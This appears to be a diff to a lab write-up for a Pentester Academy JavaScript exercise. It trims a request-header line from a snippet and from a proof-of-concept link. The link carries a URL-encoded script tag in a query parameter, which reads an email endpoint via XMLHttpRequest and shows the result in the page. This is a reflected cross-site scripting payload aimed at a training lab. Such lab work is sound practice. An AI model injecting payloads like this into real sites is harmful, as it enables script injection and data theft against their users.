@@ -24,8 +24,7 @@ xhttp.onreadystatechange = function () {
   }
 };
 xhttp.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/16/email?" + qp.toString(), true);
-xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhttp.send();
 ```
 
-For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/16?csrf_token=87756351612121977981321312312123123126554427773&url=%3Cscript%3E%0Aconst%20qp%20%3D%20new%20URLSearchParams%28location.search%29%3B%0Aqp.set%28%22name%22%2C%20%22john%22%29%3B%0A%0Aconst%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhttp.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20document.querySelector%28%22%23result%22%29.innerText%20%3D%20xhttp.responseText%3B%0A%20%20%7D%0A%7D%3B%0Axhttp.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F16%2Femail%3F%22%20%2B%20qp.toString%28%29%2C%20true%29%3B%0Axhttp.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Axhttp.send%28%29%3B%0A%3C%2Fscript%3E)
+For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/16?csrf_token=87756351612121977981321312312123123126554427773&url=%3Cscript%3E%0Aconst%20qp%20%3D%20new%20URLSearchParams%28location.search%29%3B%0Aqp.set%28%22name%22%2C%20%22john%22%29%3B%0A%0Aconst%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhttp.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20document.querySelector%28%22%23result%22%29.innerText%20%3D%20xhttp.responseText%3B%0A%20%20%7D%0A%7D%3B%0Axhttp.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F16%2Femail%3F%22%20%2B%20qp.toString%28%29%2C%20true%29%3B%0Axhttp.send%28%29%3B%0A%3C%2Fscript%3E)
